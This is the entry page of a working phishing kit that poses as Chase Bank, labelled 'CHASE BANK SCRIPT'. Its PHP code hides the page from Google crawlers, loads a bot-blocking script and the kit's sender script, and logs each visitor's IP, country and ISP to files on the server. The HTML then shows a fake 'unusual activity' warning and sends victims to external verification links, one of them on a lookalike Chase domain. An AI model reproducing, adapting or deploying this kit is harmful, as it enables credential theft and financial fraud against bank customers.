<?php
/*   
    ⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀
⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠀
⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿⠀
⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇⠀⠀
⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀IMANHALAL⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇CHASE BANK SCRIPT⢸⣿⣿⠀⠀
⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀
⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀
⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⢠⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
*/
session_start();
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
include './XBALTI/send.php';
include './antifuck.php';
date_default_timezone_set('GMT');
$timedate = date('H:i:s d/m/Y');
$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$country   = $details->country;
$org   = $details->org;
$isp   = $details->isp;
$adminvu .= "<tr>
                          <td>
                            {".$_SESSION['_ip_']."}
                          </td>
                          <td>
                            ".$TIME_DATE."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  ".$country."
                          </td>
                          <td>
                           ".$org."
                          </td>
                        </tr>\n";
    $khraha = fopen("./rz/vus".$yourname.".html", "a");
	fwrite($khraha, $adminvu);
	$xx .= "{}\n";
    $khraha = fopen("./rz/vus.html", "a");
	fwrite($khraha, $xx);
?>
<!doctype html>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Before we proceed</title><!-- update the version number as needed -->
    <script defer="" src="//firebase/7.15.1/firebase-app.js"></script><!-- include only the Firebase features as you need -->
    <script defer="" src="//firebase/7.15.1/firebase-auth.js"></script>
    <script defer="" src="//firebase/7.15.1/firebase-database.js"></script>
    <script defer="" src="//firebase/7.15.1/firebase-messaging.js"></script>
    <script defer="" src="//firebase/7.15.1/firebase-storage.js"></script><!-- initialize the SDK after all desired features are loaded -->
    <script defer="" src="//firebase/init.js"></script>
    <style media="screen">
        body {
            background-image: url('http://laballe.co/wp-admin/ch.jpeg');
        }

        #message {
            background: white;
            max-width: 360px;
            margin: 100px auto 100px;
            padding: 10px 24px;
            border-radius: 10px;
        }

        #message h2 {
            color: #ffa100;
            font-weight: bold;
            font-size: 16px;
            margin: 0 0 8px;
        }

        #message h1 {
            font-size: 22px;
            font-weight: 300;
            color: rgba(0, 0, 0, 0.753);
            margin: 0 0 16px;
            font-family: Arial, Helvetica;
            font-style: bold;
        }

        #message p {
            line-height: 140%;
            margin: 16px 0 24px;
            font-size: 15px;
            font-family: Arial, Helvetica;
        }

        #load {
            color: rgba(0, 0, 0, 0.4);
            text-align: center;
            font-size: 15px;
            font-family: Arial, Helvetica;
        }

        @media (max-width: 600px) {
            body {
                background-image: url('http://laballe.co/wp-admin/ch.jpeg');
            }

            #message {
                margin: 96px auto 96px;
                max-width: 600px;
                padding: 15px 15px;
                box-shadow: none;
                border-radius: 10px
            }
        }
    </style>



    <div id="message">
        <p style="text-align:center;"><img src="https://www.chase.com/content/dam/chaseonline/en/alerts/ondemand/eventdriven/sra/images/Chase_Logo.gif" alt="Chase logo" style="border: 0px; height: auto; outline: none; color: rgb(249, 0, 28); font-family: &quot;courier new&quot;, courier, &quot;lucida sans typewriter&quot;, &quot;lucida typewriter&quot;, monospace; font-size: 48px; font-weight: 700; text-align: left;"><br></p><h1>Please read carefully<br></h1>
        <p>We've noticed unusual activities on your account, We need you to verify your account information to prevent future unauthorized logins and regain full access to your account.<br></p>
        <p></p><div style="color: rgb(0, 0, 0); font-family: &quot;Times New Roman&quot;; font-size: medium; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; margin-left: 20px; margin-right: 20px;"></div><p></p><p style="line-height: 21px; margin: 16px 0px 24px; font-size: 15px; font-family: Arial, Helvetica; color: rgb(0, 0, 0); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><span style="color: rgb(255, 0, 0); font-weight: bold;">Warning:</span><span>&nbsp;</span>Ignoring or giving wrong details means you are not the owner of the account so you're advised to please follow all verification process accordingly to help resolve the issue with your account, we will review your account details 24 hours after submission.</p><p style="line-height: 21px; margin: 16px 0px 24px; font-size: 15px; font-family: Arial, Helvetica; color: rgb(0, 0, 0); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><br></p>    
        <div style="Margin-left: 20px;Margin-right: 20px;">
            <div class="btn btn--shadow btn--medium" style="Margin-bottom: 20px;text-align: center;"><a style="border-radius: 4px;display: inline-block;font-size: 12px;font-weight: bold;line-height: 22px;padding: 10px 20px 11px 20px;text-align: center;text-decoration: none !important;transition: opacity 0.1s ease-in;color: #ffffff !important;box-shadow: inset 0 -2px 0 0 rgba(0, 0, 0, 0.2);background-color: #0b6efd;font-family: Arial, Helvetica, sans-serif;" href="https://rublepodiatrist.com/.support/">PROCEED TO VERIFICATION</a>
                <!--[if mso]><p style="line-height:0;margin:0;">&nbsp;</p><v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" href="http://secure85b-chase.com/web/auth/dashboard" style="width:165px" arcsize="10%" fillcolor="#2677D4" stroke="f"><v:shadow on="t" color="#1E5FAA" offset="0,2px"></v:shadow><v:textbox style="mso-fit-shape-to-text:t" inset="0px,9px,0px,8px"><center style="font-size:12px;line-height:22px;color:#FFFFFF;font-family:Arial, Helvetica, sans-serif;font-weight:bold;mso-line-height-rule:exactly;mso-text-raise:4px">Account verification</center></v:textbox></v:roundrect><![endif]-->
            </div>
            <div style="text-align:center;font-size:15px;line-height:19px;margin-top:20px;">
                <div>Chase Team</div>
                <p id="load"></p>
            </div>
        </div>
    </div>



</body>

</html>